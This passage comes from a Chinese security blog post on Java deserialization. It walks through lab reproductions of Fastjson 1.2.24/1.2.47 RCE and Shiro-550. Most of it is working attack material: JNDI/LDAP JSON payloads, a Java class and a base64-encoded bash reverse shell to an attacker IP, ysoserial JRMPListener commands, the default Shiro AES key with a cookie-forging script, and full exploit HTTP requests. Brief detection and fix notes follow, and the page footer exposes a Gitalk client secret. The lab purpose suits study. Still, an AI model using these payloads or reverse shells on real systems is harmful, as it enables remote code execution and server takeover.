class="line"><span class="language-gradle">Content-Type: application/json</span></span><br><span class="line"><span class="language-gradle">Content-Length: <span class="number">141</span></span></span><br><span class="line"><span class="language-gradle"></span></span><br><span class="line"><span class="language-gradle">&#123;</span></span><br><span class="line"><span class="language-gradle">		<span class="string">&quot;b&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-gradle">				<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span></span><br><span class="line"><span class="language-gradle">				<span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://192.168.59.128:9437/LinuxTouch&quot;</span>,</span></span><br><span class="line"><span class="language-gradle">				<span class="string">&quot;autoCommit&quot;</span>: <span class="keyword">true</span></span></span><br><span class="line"><span class="language-gradle">		&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>意外情况：</p>
<ol>
<li>我将docker设在本机，发生了虚拟机kali访问不了本机容器的问题，原因是防火墙设置了docker不允许在公网上通行，在防火墙里面允许就行了.</li>
<li>关于BP发送Payload出现 Set Property Error，autoCommit的错误。<br />解决：没解决，后来发现不知道怎么回事，代码是执行成功了的。<br />因为响应500是正确的。</li>
</ol>
</blockquote>
<p>进入容器查看目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -i -t docker_id /bin/bash</span><br><span class="line">docker <span class="built_in">exec</span> docker_id <span class="built_in">ls</span> <span class="built_in">dir</span></span><br></pre></td></tr></table></figure>

<h3 id="4-1-2-Fastjson-1-2-47-RCE漏洞"><a href="#4-1-2-Fastjson-1-2-47-RCE漏洞" class="headerlink" title="4.1.2 Fastjson 1.2.47 RCE漏洞"></a>4.1.2 Fastjson 1.2.47 RCE漏洞</h3><p>同样使用 vulhub 搭建靶场，不赘述。</p>
<blockquote>
<p>我的问题——复现不顺利的原因：</p>
<ol>
<li>没有将所有的IP改为自己的IP</li>
<li>要使用BP或其他抓包软件，先抓一个包，构造请求头，直接用wget构造post请求一直失败，难道是因为我只添加了POST数据？</li>
<li>我按照vulhub里面的教程进行仍然使用的RMI而不是LDAP，然后就出现了下面这个错误，大概意思就是RMIRefServer调用错误。</li>
</ol>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception <span class="keyword">in</span> thread <span class="string">&quot;main&quot;</span> java.lang.IllegalAccessError: class marshalsec.jndi.RMIRefServer (<span class="keyword">in</span> unnamed module @0x614635c2) cannot access class com.sun.jndi.rmi.registry.ReferenceWrapper (<span class="keyword">in</span> module jdk.naming.rmi) because module jdk.naming.rmi does not <span class="built_in">export</span> com.sun.jndi.rmi.registry to unnamed module @0x614635c2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<br />
:::success
勘误：上面出现的错误是因为不小心使用了不正确的绝对路径导致编译器javac为17版本的而不是8版本的。<br />所以，**RMI和LDAP都可以**。优先使用**LDAP**，该服务受版本的影响较RMI小。
:::


<p><strong>编译LinuxRevers.java：使用绝对路径的javac</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac LinuxRevers.java</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line">public class LinuxRevers &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.59.128/9001 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>攻击机（Kali）监听9001端口</strong>：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">9001</span></span><br></pre></td></tr></table></figure>
<p><strong>开启Http服务</strong>：</p>
<ul>
<li>python -m http.server 8089			py3</li>
<li>python -m SimpleHTTPServer 8088	py2</li>
</ul>
<p><strong>开启 LDAP 服务</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SHAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.59.128:8089/#LinuxRevers&quot;</span> 9473</span><br></pre></td></tr></table></figure>

<p>Paylod，这里还是BP拦截放包吧，wget发包发不出去，不过可以试试Curl，Curl应该是可以的。<br>POC HTTP请求POST &#x2F; HTTP&#x2F;1.1<br />Host: 192.168.59.140:8090<br />User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:102.0) Gecko&#x2F;20100101 Firefox&#x2F;102.0<br />Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br />Accept-Language: en-US,en;q&#x3D;0.5<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Upgrade-Insecure-Requests: 1<br />Content-Type: application&#x2F;json<br />Content-Length: 273</p>
<p>{<br />    “a”:{<br />        “@type”:”java.lang.Class”,<br />        “val”:”com.sun.rowset.JdbcRowSetImpl”<br />    },<br />    “b”:{<br />        “@type”:”com.sun.rowset.JdbcRowSetImpl”,<br />        “dataSourceName”:”ldap:&#x2F;&#x2F;192.168.59.128:9437&#x2F;LinuxRevers”,<br />        “autoCommit”:true<br />    }<br />}</p>
<p><strong>Payload反序列化过程分析</strong>：<br />对JSON数据进行反序列化会自动调用成员变量的set&#x2F;get&#x2F;is方法：</p>
<ol>
<li>对a对象进行序列化，识别<code>@type</code>，将a作为<code>java.lang.Class</code>类的对象进行反序列化，该类为一个在缓存中找类的类，通过调用Set方法，setVal()，找 <code>com.sun.rowset.JdbcRowSetImpl</code> 类，从而绕过对<code>com.sun.rowset.JdbcRowSetImpl</code>的限制（黑名单）</li>
<li>对b对象识别为<code>com.sun.rowset.JdbcRowSetImpl</code>类的对象进行反序列化，连续调用setDataSourceName和setAutoCommit方法，实现远程调用恶意文件LinuxRevers.class.</li>
</ol>
<h2 id="4-2-Fastjson漏洞挖掘-x2F-检测"><a href="#4-2-Fastjson漏洞挖掘-x2F-检测" class="headerlink" title="4.2 Fastjson漏洞挖掘&#x2F;检测"></a>4.2 Fastjson漏洞挖掘&#x2F;检测</h2><ol>
<li>找到<strong>发送 JSON 的接口</strong></li>
<li>判断：<ol>
<li>非法格式错误，报错显示版本<ol>
<li>{“x”:,}</li>
</ol>
</li>
<li>使用 dnslog 探测<ol>
<li>{“x”:{“@type”:”java.net.Inet4Address”,”val”:”xxx.dnslog.cn”}}</li>
</ol>
</li>
<li>BurpSuite 插件<ol>
<li>github.com&#x2F;zilong3033&#x2F;fastjsonScan</li>
</ol>
</li>
<li>Fofa Dork</li>
</ol>
</li>
</ol>
<h2 id="4-3-FastJson-漏洞修复"><a href="#4-3-FastJson-漏洞修复" class="headerlink" title="4.3 FastJson 漏洞修复"></a>4.3 FastJson 漏洞修复</h2><ol>
<li>升级JDK版本，FASTJSON版本</li>
<li>使用WAF</li>
<li>更换JSON处理器如GSON，Jackson</li>
</ol>
<h1 id="5-Shiro-反序列化漏洞"><a href="#5-Shiro-反序列化漏洞" class="headerlink" title="5 Shiro 反序列化漏洞"></a>5 Shiro 反序列化漏洞</h1><p>Apache Shiro漏洞，vulhub搭建靶场，JDK8版本的Bp，因为环境只有改版的jdk。</p>
<h2 id="5-1-Apache-Shiro-简介"><a href="#5-1-Apache-Shiro-简介" class="headerlink" title="5.1 Apache Shiro 简介"></a>5.1 Apache Shiro 简介</h2><p>Shiro是一个开源<strong>安全框架</strong>，具有身份验证、授权、会话管理和加密功能。</p>
<p><strong>shiro环境搭建</strong>：</p>
<ol>
<li>准备Tomcat服务器，shiro1.2.4源码和shiro1.4.1源码</li>
<li>JDK8的编译环境和IDEA的开发环境，使用 IDEA 方便进行Tomcat和JDK的配置，以及运行代码</li>
<li>进入shiro源码中stamble\web文件夹中创建工程，在Run&#x2F;debug Configuration 中配置JDK8，Tomcat8.0服务器的端口，访问地址。</li>
<li>运行，debug，直到出现正确的页面</li>
<li>引入POC，运行</li>
<li>漏洞复现</li>
</ol>
<h2 id="5-2-Shiro-漏洞"><a href="#5-2-Shiro-漏洞" class="headerlink" title="5.2 Shiro 漏洞"></a>5.2 Shiro 漏洞</h2><p>基础知识：</p>
<ol>
<li>shiro Cookie生成和解析过程</li>
</ol>
<ul>
<li>shiro序列化-&gt;AES加密-&gt;Base64编码-&gt;写入Cookie</li>
<li>验证Cookie-&gt;Base64解码-&gt;AES解密-&gt;对序列化数据反序列化</li>
</ul>
<ol start="2">
<li>JRMP服务器，Java远程方法协议</li>
<li>ysoserial工具<ol>
<li>github.com&#x2F;frohoff&#x2F;ysoserial</li>
<li>编译打包 mvn package -D ‘skipTest’</li>
<li>POP Gadgets</li>
<li>Property-Oriented Programming</li>
</ol>
</li>
</ol>
<p>漏洞原因：<strong>shiro对Cookie的序列化数据没有进行检查</strong></p>
<h3 id="5-2-1-Shiro-550-2016-lt-x3D-1-2-4"><a href="#5-2-1-Shiro-550-2016-lt-x3D-1-2-4" class="headerlink" title="5.2.1 Shiro-550 2016  &lt;&#x3D;1.2.4"></a>5.2.1 Shiro-550 2016  &lt;&#x3D;1.2.4</h3><p>攻击者通过爆破或者信息收集找到目标站点所使用的<strong>Shiro默认密钥</strong>，就可以用其构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时执行恶意命令。</p>
<h4 id="5-2-1-1-漏洞检测"><a href="#5-2-1-1-漏洞检测" class="headerlink" title="5.2.1.1 漏洞检测"></a>5.2.1.1 漏洞检测</h4><ul>
<li>set-cookie字段是否存在 rememberMe&#x3D;deleteMe</li>
<li>fofa dork，范围搜索此类网站<ul>
<li>header&#x3D;”rememberme&#x3D;deleteme”</li>
<li>header&#x3D;”shiroCookie”</li>
</ul>
</li>
<li>检测利用工具<ul>
<li>shiro_tool.jar<ul>
<li>java -jar shiro_tool.jar <a class="link"   target="_blank" rel="noopener" href="http://192.168.59.140:8080/" >http://192.168.59.140:8080<i class="fas fa-external-link-alt"></i></a></li>
</ul>
</li>
<li>ShiroExploitV2.51</li>
<li><strong>shiro_attack-v2.0.jar</strong>，这个比较好用</li>
</ul>
</li>
</ul>
<h4 id="5-2-1-2-攻击流程1"><a href="#5-2-1-2-攻击流程1" class="headerlink" title="5.2.1.2 攻击流程1"></a>5.2.1.2 攻击流程1</h4><p>准备反弹shell代码，去<a class="link"   target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/" >Runtime.exec<i class="fas fa-external-link-alt"></i></a> 生成<strong>payload1</strong>：</p>
<ul>
<li><p>反弹shell 代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">59.128</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>runtime.exec 可执行的代码，即<strong>payload1</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjEyOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol>
<li><p>攻击机监听反弹连接端口</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">7777</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击机建立JRMP服务器，设置监听端口8888，当有主机连接至8888端口，使用CommonsCollections5攻击链执行后面的payload1。（能不能执行成功就看目标主机是否有可利用的CC攻击链）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener <span class="number">8888</span> CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjEyOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Payload2，使用 shiro.py 生成加密编码后的Cookie，即Payload2的主体，该cookie的作用是在<strong>目标主机对Cookie进行反序列化</strong>时，连接攻击机8888端口。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip install pycrypto 或者 pycryptodome</span></span><br><span class="line">python3 shiro.py <span class="number">192.168</span>.<span class="number">59.128</span>:<span class="number">8888</span></span><br><span class="line"><span class="comment"># 生成一个 cookie</span></span><br><span class="line"><span class="comment"># rememberMe=xxx</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击机使用BP抓包改包发送payload2至shiro web服务器192.168.59.140:8080，BP HTTP Payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /doLogin HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">59.140</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">102.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">102.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 26</span></span><br><span class="line"><span class="comment">Origin: http://192.168.59.140:8080</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://192.168.59.140:8080/login;jsessionid=3720A20EDFB4FA49CE7F5286E643564A</span></span><br><span class="line"><span class="comment">Cookie: rememberMe=URcKnCBrR2yHbAas9RcsxuMPQooL9dWjDjSslUTa6R+TQO2nlmAYnAWrsvDHk2cFOyNEqgcyzVQRArcEMOGEbGKy3zmW6JXbajYcNdsqzU2relIAr7RiOdC4xD39CbTJa9rxttT7G33mLQaQd8JcsfVo1APSVOmVLbYHJCJUHL7+GYewyNFHD/MYKJ5VzD6jv5asctMBTuP2QAgUcq7IkYkw8vBCOlvZ8C55A6/M+34ETyNyeQkP/bT5w8ATnhAmqj41tukk9dtyyiDAMtUfo114jS+9ARLxHU7NOsGMOl9eFfPkr7J2KbkhO4QbEomjh8OQ9+oyiAZ+o3atwLt3cIaDOfY3P2Wned4oDXqd+umpD0e+KEgEPty6aAIS7xhx2R/7YOu9h8QyCafUEgYosQ==</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">username=ads+&amp;password=asf</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>shiro web 服务器连接攻击机JRMP服务端口，shiro web服务器会自动使用ApacheCC利用链5来调用后面的反弹shell代码</p>
</li>
</ol>
<blockquote>
<p><strong>实验中出现的问题</strong>：</p>
<ol>
<li>windows10攻击机安装的python3.7，安装pycrypto，说缺少 MSC++ 14.0 组件，然后安装这个组件失败。</li>
<li>Kali自带3.10python，安装pycrypto，运行shiro.py出现jdk不匹配以及 # format的问题，这里需要将shiro.py中的java改为jdk8的绝对路径，后者则需要使用低版本的python或者更换加密包，我更换了加密包 pycryptodome。</li>
</ol>
</blockquote>
<p>更改后的 shiro.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    <span class="comment"># 打开JRMP客户端，连接到特定端口</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;/home/kali/jdk/jdk1.8.0_181/bin/java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="comment"># 用获取到的key  AES加密</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    <span class="comment"># 生成随机16位长度的IV</span></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    <span class="comment"># base64编码</span></span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>:::success<br>总结：</p>
<ol>
<li>手工复现时使用了 shiro.py 的加密脚本，这个脚本简单，可以学学AES加密和Base64编码，以后可以自己编写。</li>
<li>使用了ysoserial.jar开启JRMP服务监听端口等待连接，使用ysoserial-0.0.6-SNAPSHOT-all.jar来生成序列化数据，该序列化数据被反序列化就会连接攻击机8888端口，然后使用shiro.py进行加密生成Cookie。<br>:::</li>
</ol>
<h3 id="5-2-2-Shiro-721-2019-lt-x3D-1-4-1"><a href="#5-2-2-Shiro-721-2019-lt-x3D-1-4-1" class="headerlink" title="5.2.2 Shiro-721 2019 &lt;&#x3D;1.4.1"></a>5.2.2 Shiro-721 2019 &lt;&#x3D;1.4.1</h3><p>需要先进行登录，获取Cookie，然后根据这个Cookie进行密钥爆破。</p>
<h2 id="5-3-Shiro修复防御"><a href="#5-3-Shiro修复防御" class="headerlink" title="5.3 Shiro修复防御"></a>5.3 Shiro修复防御</h2><ol>
<li>升级产品版本</li>
<li>部署安全产品，如WAF</li>
</ol>
<p>github.com&#x2F;ikkisoft**&#x2F;SerialKiller**</p>

            </div>

            
                <div class="post-copyright-info">
                    
<div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li class="post-title">
            <span class="type">本文标题</span>：<span class="content">Java反序列化</span>
        </li>
        <li class="post-author">
            <span class="type">本文作者</span>：<span class="content">xisuansec</span>
        </li>
        <li class="post-time">
            <span class="type">创建时间</span>：<span class="content">2023-05-03 13:00:56</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2023/05/03/Java反序列化基础/</span>
        </li>
        <li class="post-license">
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
        <i class="fa-solid fa-copy"></i>
    </div>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/Web%E5%AE%89%E5%85%A8/">#Web安全</a>&nbsp;
                        </li>
                    
                        <li class="tag-item">
                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/05/03/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">SQL注入基础-以MySQL为例</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/05/02/hello-world/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Hello World</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;评论
    </div>
    
        
            

    <div class="gitalk-comment-container">
        <div id="gitalk-container"></div>
        <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
        <script  src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
        <script >
          function loadGitalk() {
            let __gitalk__pathname = decodeURI(location.pathname);
            const __gitalk__pathnameLength = __gitalk__pathname.length;
            const __gitalk__pathnameMaxLength = 50;
            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
            }

            try {
              Gitalk && new Gitalk({
                clientID: '17efb64209824b16935b',
                clientSecret: '2ceab4677a6e6b5ebd72a6d3207a6611b13b7e95',
                repo: 'hexo-blog-comments',
                owner: 'xisuansec',
                admin: 'xisuansec',
                id: __gitalk__pathname,
                proxy: '',
                language: 'zh-CN'
              }).render('gitalk-container');
            } catch (e) {
              window.Gitalk = null;
            }
          }

          if ('false' === 'true') {
            const loadGitalkTimeout = setTimeout(() => {
              loadGitalk();
              clearTimeout(loadGitalkTimeout);
            }, 1000);
          } else {
            window.addEventListener('DOMContentLoaded', loadGitalk);
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">1 Java 序列化和反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">2 Java 反序列化漏洞简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-Apache-Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">3 Apache Commons Collections 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-CC%E5%85%B3%E9%94%AE%E7%B1%BB"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 CC关键类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 利用条件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 反序列化过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-%E4%BF%AE%E5%A4%8D"><span class="nav-number">3.4.</span> <span class="nav-text">3.4 修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-Alibaba-Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">4 Alibaba Fastjson 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-Fastjson%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 Fastjson漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-1-Fastjson-1-2-24-RCE-%E6%BC%8F%E6%B4%9E-%EF%BC%88CVE-2017-18349%EF%BC%89"><span class="nav-number">4.1.1.</span> <span class="nav-text">4.1.1 Fastjson 1.2.24 RCE 漏洞 （CVE-2017-18349）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-2-Fastjson-1-2-47-RCE%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.1.2.</span> <span class="nav-text">4.1.2 Fastjson 1.2.47 RCE漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-Fastjson%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-x2F-%E6%A3%80%E6%B5%8B"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 Fastjson漏洞挖掘&#x2F;检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-FastJson-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">4.3.</span> <span class="nav-text">4.3 FastJson 漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">5 Shiro 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-Apache-Shiro-%E7%AE%80%E4%BB%8B"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 Apache Shiro 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-Shiro-%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 Shiro 漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-1-Shiro-550-2016-lt-x3D-1-2-4"><span class="nav-number">5.2.1.</span> <span class="nav-text">5.2.1 Shiro-550 2016  &lt;&#x3D;1.2.4</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-1-1-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="nav-number">5.2.1.1.</span> <span class="nav-text">5.2.1.1 漏洞检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-1-2-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B1"><span class="nav-number">5.2.1.2.</span> <span class="nav-text">5.2.1.2 攻击流程1</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-2-Shiro-721-2019-lt-x3D-1-4-1"><span class="nav-number">5.2.2.</span> <span class="nav-text">5.2.2 Shiro-721 2019 